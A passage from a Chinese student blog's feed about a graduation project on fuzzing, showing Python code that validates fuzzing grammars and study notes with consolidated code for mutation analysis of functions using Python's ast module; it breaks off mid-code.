punctuation">.</span>stderr<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>expansions<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>defined_nonterminal<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": expansion list empty"</span><span class="token punctuation">,</span>                  <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span>        <span class="token keyword">for</span> expansion <span class="token keyword">in</span> expansions<span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>expansion<span class="token punctuation">,</span> <span class="token builtin">tuple</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                expansion <span class="token operator">=</span> expansion<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>expansion<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>defined_nonterminal<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": "</span>                      <span class="token operator">+</span> <span class="token builtin">repr</span><span class="token punctuation">(</span>expansion<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": not a string"</span><span class="token punctuation">,</span>                      <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span>            <span class="token keyword">for</span> used_nonterminal <span class="token keyword">in</span> nonterminals<span class="token punctuation">(</span>expansion<span class="token punctuation">)</span><span class="token punctuation">:</span>                used_nonterminals<span class="token punctuation">.</span>add<span class="token punctuation">(</span>used_nonterminal<span class="token punctuation">)</span>    <span class="token keyword">return</span> defined_nonterminals<span class="token punctuation">,</span> used_nonterminals<span class="token keyword">def</span> <span class="token function">reachable_nonterminals</span><span class="token punctuation">(</span>grammar<span class="token punctuation">:</span> Grammar<span class="token punctuation">,</span>                           start_symbol<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> START_SYMBOL<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Set<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    reachable <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">_find_reachable_nonterminals</span><span class="token punctuation">(</span>grammar<span class="token punctuation">,</span> symbol<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">nonlocal</span> reachable        reachable<span class="token punctuation">.</span>add<span class="token punctuation">(</span>symbol<span class="token punctuation">)</span>        <span class="token keyword">for</span> expansion <span class="token keyword">in</span> grammar<span class="token punctuation">.</span>get<span class="token punctuation">(</span>symbol<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> nonterminal <span class="token keyword">in</span> nonterminals<span class="token punctuation">(</span>expansion<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> nonterminal <span class="token keyword">not</span> <span class="token keyword">in</span> reachable<span class="token punctuation">:</span>                    _find_reachable_nonterminals<span class="token punctuation">(</span>grammar<span class="token punctuation">,</span> nonterminal<span class="token punctuation">)</span>    _find_reachable_nonterminals<span class="token punctuation">(</span>grammar<span class="token punctuation">,</span> start_symbol<span class="token punctuation">)</span>    <span class="token keyword">return</span> reachable<span class="token keyword">def</span> <span class="token function">unreachable_nonterminals</span><span class="token punctuation">(</span>grammar<span class="token punctuation">:</span> Grammar<span class="token punctuation">,</span>                             start_symbol<span class="token operator">=</span>START_SYMBOL<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Set<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> grammar<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> reachable_nonterminals<span class="token punctuation">(</span>grammar<span class="token punctuation">,</span> start_symbol<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">opts_used</span><span class="token punctuation">(</span>grammar<span class="token punctuation">:</span> Grammar<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Set<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    used_opts <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> symbol <span class="token keyword">in</span> grammar<span class="token punctuation">:</span>        <span class="token keyword">for</span> expansion <span class="token keyword">in</span> grammar<span class="token punctuation">[</span>symbol<span class="token punctuation">]</span><span class="token punctuation">:</span>            used_opts <span class="token operator">|</span><span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span>exp_opts<span class="token punctuation">(</span>expansion<span class="token punctuation">)</span><span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> used_opts<span class="token keyword">def</span> <span class="token function">is_valid_grammar</span><span class="token punctuation">(</span>grammar<span class="token punctuation">:</span> Grammar<span class="token punctuation">,</span>                     start_symbol<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> START_SYMBOL<span class="token punctuation">,</span>                      supported_opts<span class="token punctuation">:</span> Set<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Check if the given `grammar` is valid.       `start_symbol`: optional start symbol (default: `&lt;start>`)       `supported_opts`: options supported (default: none)"""</span>    defined_nonterminals<span class="token punctuation">,</span> used_nonterminals <span class="token operator">=</span> \        def_used_nonterminals<span class="token punctuation">(</span>grammar<span class="token punctuation">,</span> start_symbol<span class="token punctuation">)</span>    <span class="token keyword">if</span> defined_nonterminals <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> used_nonterminals <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token comment"># Do not complain about '&lt;start>' being not used,</span>    <span class="token comment"># even if start_symbol is different</span>    <span class="token keyword">if</span> START_SYMBOL <span class="token keyword">in</span> grammar<span class="token punctuation">:</span>        used_nonterminals<span class="token punctuation">.</span>add<span class="token punctuation">(</span>START_SYMBOL<span class="token punctuation">)</span>    <span class="token keyword">for</span> unused_nonterminal <span class="token keyword">in</span> defined_nonterminals <span class="token operator">-</span> used_nonterminals<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>unused_nonterminal<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": defined, but not used"</span><span class="token punctuation">,</span>              <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>    <span class="token keyword">for</span> undefined_nonterminal <span class="token keyword">in</span> used_nonterminals <span class="token operator">-</span> defined_nonterminals<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>undefined_nonterminal<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": used, but not defined"</span><span class="token punctuation">,</span>              <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>    <span class="token comment"># Symbols must be reachable either from &lt;start> or given start symbol</span>    unreachable <span class="token operator">=</span> unreachable_nonterminals<span class="token punctuation">(</span>grammar<span class="token punctuation">,</span> start_symbol<span class="token punctuation">)</span>    msg_start_symbol <span class="token operator">=</span> start_symbol    <span class="token keyword">if</span> START_SYMBOL <span class="token keyword">in</span> grammar<span class="token punctuation">:</span>        unreachable <span class="token operator">=</span> unreachable <span class="token operator">-</span> \            reachable_nonterminals<span class="token punctuation">(</span>grammar<span class="token punctuation">,</span> START_SYMBOL<span class="token punctuation">)</span>        <span class="token keyword">if</span> start_symbol <span class="token operator">!=</span> START_SYMBOL<span class="token punctuation">:</span>            msg_start_symbol <span class="token operator">+=</span> <span class="token string">" or "</span> <span class="token operator">+</span> START_SYMBOL    <span class="token keyword">for</span> unreachable_nonterminal <span class="token keyword">in</span> unreachable<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>unreachable_nonterminal<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": unreachable from "</span> <span class="token operator">+</span> msg_start_symbol<span class="token punctuation">,</span>              <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>    used_but_not_supported_opts <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>supported_opts<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        used_but_not_supported_opts <span class="token operator">=</span> opts_used<span class="token punctuation">(</span>            grammar<span class="token punctuation">)</span><span class="token punctuation">.</span>difference<span class="token punctuation">(</span>supported_opts<span class="token punctuation">)</span>        <span class="token keyword">for</span> opt <span class="token keyword">in</span> used_but_not_supported_opts<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>                <span class="token string">"warning: option "</span> <span class="token operator">+</span>                <span class="token builtin">repr</span><span class="token punctuation">(</span>opt<span class="token punctuation">)</span> <span class="token operator">+</span>                <span class="token string">" is not supported"</span><span class="token punctuation">,</span>                <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>    <span class="token keyword">return</span> used_nonterminals <span class="token operator">==</span> defined_nonterminals <span class="token keyword">and</span> <span class="token builtin">len</span><span class="token punctuation">(</span>unreachable<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 毕设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>毕设-Fuzz-4</title>
      <link href="/2021/11/27/bi-she-fuzz-4/"/>
      <url>/2021/11/27/bi-she-fuzz-4/</url>
      
        <content type="html"><![CDATA[<h1 id="NoteBook阅读"><a href="#NoteBook阅读" class="headerlink" title="NoteBook阅读"></a>NoteBook阅读</h1><h2 id="Mutation-Analyze"><a href="#Mutation-Analyze" class="headerlink" title="Mutation Analyze"></a>Mutation Analyze</h2><p>关于ast–<code>Abstract Syntax Trees</code> 可算是找到一篇讲的非常清楚的博客了. 看了之后自己又调试了一遍代码,清楚多了</p><p><a href="https://www.cnblogs.com/qiulinzhang/p/14258626.html">https://www.cnblogs.com/qiulinzhang/p/14258626.html</a></p><p>清楚这个之后,再去搞清楚这一小节写的代码逻辑,想必应该要轻松不少了.</p><h3 id="7-A-Simple-mutator-for-Function"><a href="#7-A-Simple-mutator-for-Function" class="headerlink" title="7 A Simple mutator for Function"></a>7 A Simple mutator for Function</h3><p>总算搞清楚这个代码的逻辑了</p><ul><li><p>第一开始初始化的时候,并没有直接修改源代码,只是做了一个统计. 看一下需要变异的节点有多少个</p></li><li><p>后面provoke generate_mutant函数将location传递进来的时候才会发生突变. 换句话说, 这个location的具体含义是要在第几个变异节点发生变异</p></li><li><p>在 generate_mutant函数中<code>mutant_ast = self.pm.mutator_object(location).visit(ast.parse(self.pm.src))  # copy</code>中的<code>ast.parse(self.pm.src)</code>就是每一次都把源代码解析的ast对象传递进去, 目的就是为了控制变量. 这样就能获取到每一个单个突变位置的突变. 最后再利用diff库中的函数进行与原始版本的比较.</p></li></ul><p><strong>作者把类中的函数分开来讲解,确实在对单个函数的说明上起到了一定的作用.但是对于类整体的功能理解上, 还是有一定的影响</strong></p><p>我把单独的代码整合到了一起去看代码的逻辑, 终于清晰了不少</p><h4 id="整合代码"><a href="#整合代码" class="headerlink" title="整合代码"></a>整合代码</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MuFunctionAnalyzer</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">__iter__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"__iter__"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> PMIterator<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> fn<span class="token punctuation">,</span> log<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>fn <span class="token operator">=</span> fn        self<span class="token punctuation">.</span>name <span class="token operator">=</span> fn<span class="token punctuation">.</span>__name__        src <span class="token operator">=</span> inspect<span class="token punctuation">.</span>getsource<span class="token punctuation">(</span>fn<span class="token punctuation">)</span> <span class="token comment"># 获取源码</span>        self<span class="token punctuation">.</span>ast <span class="token operator">=</span> ast<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>src<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>src <span class="token operator">=</span> ast<span class="token punctuation">.</span>unparse<span class="token punctuation">(</span>self<span class="token punctuation">.</span>ast<span class="token punctuation">)</span>  <span class="token comment"># normalize</span>        self<span class="token punctuation">.</span>mutator <span class="token operator">=</span> self<span class="token punctuation">.</span>mutator_object<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>nmutations <span class="token operator">=</span> self<span class="token punctuation">.</span>get_mutation_count<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>un_detected <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>mutants <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>log <span class="token operator">=</span> log    <span class="token keyword">def</span> <span class="token function">mutator_object</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> locations<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> StmtDeletionMutator<span class="token punctuation">(</span>locations<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>mutants<span class="token punctuation">.</span>append<span class="token punctuation">(</span>m<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">finish</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>        <span class="token keyword">def</span> <span class="token function">get_mutation_count</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>mutator<span class="token punctuation">.</span>visit<span class="token punctuation">(</span>self<span class="token punctuation">.</span>ast<span class="token punctuation">)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>mutator<span class="token punctuation">.</span>count        <span class="token keyword">class</span> <span class="token class-name">StmtDeletionMutator</span><span class="token punctuation">(</span>ast<span class="token punctuation">.</span>NodeTransformer<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> mutate_location<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>count <span class="token operator">=</span> <span class="token number">0</span>        self<span class="token punctuation">.</span>mutate_location <span class="token operator">=</span> mutate_location        <span class="token keyword">def</span> <span class="token function">mutation_visit</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> ast<span class="token punctuation">.</span>Pass<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token keyword">def</span> <span class="token function">mutable_visit</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>count <span class="token operator">+=</span> <span class="token number">1</span>  <span class="token comment"># statements start at line no 1</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>count <span class="token operator">==</span> self<span class="token punctuation">.</span>mutate_location<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"进行替换"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>mutation_visit<span class="token punctuation">(</span>node<span class="token punctuation">)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>generic_visit<span class="token punctuation">(</span>node<span class="token punctuation">)</span>        <span class="token keyword">def</span> <span class="token function">visit_Return</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"visit_Return"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>mutable_visit<span class="token punctuation">(</span>node<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">visit_Delete</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> self<span class="token punctuation">.</span>mutable_visit<span class="token punctuation">(</span>node<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">visit_Assign</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> self<span class="token punctuation">.</span>mutable_visit<span class="token punctuation">(</span>node<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">visit_AnnAssign</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> self<span class="token punctuation">.</span>mutable_visit<span class="token punctuation">(</span>node<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">visit_AugAssign</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> self<span class="token punctuation">.</span>mutable_visit<span class="token punctuation">(</span>node<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">visit_Raise</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> self<span class="token punctuation">.</span>mutable_visit<span class="token punctuation">(</span>node<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">visit_Assert</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> self<span class="token punctuation">.</span>mutable_visit<span class="token punctuation">(</span>node<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">visit_Global</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> self<span class="token punctuation">.</span>mutable_visit<span class="token punctuation">(</span>node<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">visit_Nonlocal</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> self<span class="token punctuation">.</span>mutable_visit<span class="token punctuation">(</span>node<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">visit_Expr</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> self<span class="token punctuation">.</span>mutable_visit<span class="token punctuation">(</span>node<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">visit_Pass</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> self<span class="token punctuation">.</span>mutable_visit<span class="token punctuation">(</span>node<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">visit_Break</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> self<span class="token punctuation">.</span>mutable_visit<span class="token punctuation">(</span>node<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">visit_Continue</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> self<span class="token punctuation">.</span>mutable_visit<span class="token punctuation">(</span>node<span class="token punctuation">)</span>    <span class="token keyword">class</span> <span class="token class-name">PMIterator</span><span class="token punctuation">(</span>PMIterator<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> pm<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>pm <span class="token operator">=</span> pm        self<span class="token punctuation">.</span>idx <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">def</span> <span class="token function">__next__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> self<span class="token punctuation">.</span>idx        <span class="token keyword">if</span> i <span class="token operator">>=</span> self<span class="token punctuation">.</span>pm<span class="token punctuation">.</span>nmutations<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>pm<span class="token punctuation">.</span>finish<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">raise</span> StopIteration<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>idx <span class="token operator">+=</span> <span class="token number">1</span>        mutant <span class="token operator">=</span> Mutant<span class="token punctuation">(</span>self<span class="token punctuation">.</span>pm<span class="token punctuation">,</span> self<span class="token punctuation">.</span>idx<span class="token punctuation">,</span> log<span class="token operator">=</span>self<span class="token punctuation">.</span>pm<span class="token punctuation">.</span>log<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>pm<span class="token punctuation">.</span>register<span class="token punctuation">(</span>mutant<span class="token punctuation">)</span>        <span class="token keyword">return</span> mutant<span class="token keyword">class</span> <span class="token class-name">Mutant</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> pm<span class="token punctuation">,</span> location<span class="token punctuation">,</span> log<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>pm <span class="token operator">=</span> pm        <span class="token comment">#print(pm)</span>        self<span class="token punctuation">.</span>i <span class="token operator">=</span> location        self<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"%s_%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>pm<span class="token punctuation">.</span>name<span class="token punctuation">,</span> self<span class="token punctuation">.</span>i<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>_src <span class="token operator">=</span> <span class="token boolean">None</span>        self<span class="token punctuation">.</span>tests <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>detected <span class="token operator">=</span> <span class="token boolean">False</span>        self<span class="token punctuation">.</span>log <span class="token operator">=</span> log    <span class="token keyword">def</span> <span class="token function">generate_mutant</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> location<span class="token punctuation">)</span><span class="token punctuation">:</span>        mutant_ast <span class="token operator">=</span> self<span class="token punctuation">.</span>pm<span class="token punctuation">.</span>mutator_object<span class="token punctuation">(</span>            location<span class="token punctuation">)</span><span class="token punctuation">.</span>visit<span class="token punctuation">(</span>ast<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>self<span class="token punctuation">.</span>pm<span class="token punctuation">.</span>src<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># copy</span>        <span class="token keyword">return</span> ast<span class="token punctuation">.</span>unparse<span class="token punctuation">(</span>mutant_ast<span class="token punctuation">)</span>        <span class="token keyword">def</span> <span class="token function">src</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>_src <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>_src <span class="token operator">=</span> self<span class="token punctuation">.</span>generate_mutant<span class="token punctuation">(</span>self<span class="token punctuation">.</span>i<span class="token punctuation">)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>_src    <span class="token keyword">def</span> <span class="token function">diff</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>difflib<span class="token punctuation">.</span>unified_diff<span class="token punctuation">(</span>self<span class="token punctuation">.</span>pm<span class="token punctuation">.</span>src<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                              self<span class="token punctuation">.</span>src<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                              fromfile<span class="token operator">=</span><span class="token string">'original'</span><span class="token punctuation">,</span>                                              tofile<span class="token operator">=</span><span class="token string">'mutant'</span><span class="token punctuation">,</span>                                              n<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>下面是运行代码, 还有一些解释性的语句, 自认为已经比较清楚了.</p></blockquote><h4 id="运行代码"><a href="#运行代码" class="headerlink" title="运行代码"></a>运行代码</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">test <span class="token operator">=</span> MuFunctionAnalyzer<span class="token punctuation">(</span>triangle<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"test.nmutations:"</span><span class="token punctuation">,</span>test<span class="token punctuation">.</span>nmutations<span class="token punctuation">)</span><span class="token keyword">for</span> m <span class="token keyword">in</span> test<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=======这是第%d次变异===================="</span> <span class="token operator">%</span> m<span class="token punctuation">.</span>i<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"原始代码："</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>mutant<span class="token punctuation">.</span>pm<span 